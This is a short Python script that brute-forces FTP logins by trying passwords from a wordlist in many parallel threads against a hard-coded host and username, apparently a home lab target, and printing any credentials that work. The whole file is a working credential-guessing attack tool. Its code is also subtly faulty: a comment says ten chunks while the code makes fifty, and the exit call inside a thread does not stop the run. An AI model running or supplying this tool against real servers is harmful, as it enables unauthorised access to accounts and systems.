import sys
from ftplib import FTP
import threading

def ftp_login(target, username, password, port):
    try:
        ftp = FTP()
        ftp.connect(target, port)
        ftp.login(username, password)
        ftp.quit()
        print("\n[!] Credentials found.")
        print("\n[!] Username: {}".format(username))
        print("\n[!] Password: {}".format(password))
        sys.exit(0)
    except Exception as e:
        pass

def brute_force_chunk(target, username, wordlist_chunk, port):
    for password in wordlist_chunk:
        password = password.strip()
        ftp_login(target, username, password, port)

def brute_force(target, username, wordlist, port):
    try:
        with open(wordlist, "r") as wordlist_file:
            words = wordlist_file.readlines()
            chunk_size = len(words) // 50  # Diviser la liste de mots de passe en 10 chunks
            wordlist_chunks = [words[i:i+chunk_size] for i in range(0, len(words), chunk_size)]

            threads = []
            for chunk in wordlist_chunks:
                thread = threading.Thread(target=brute_force_chunk, args=(target, username, chunk, port))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

    except FileNotFoundError:
        print("\n[-] There is no such wordlist file.\n")
        sys.exit(1)

    print("\n[-] Brute force finished.\n")

brute_force("10.0.2.15", "yassir", "/usr/share/wordlists/fasttrack.txt", 21)
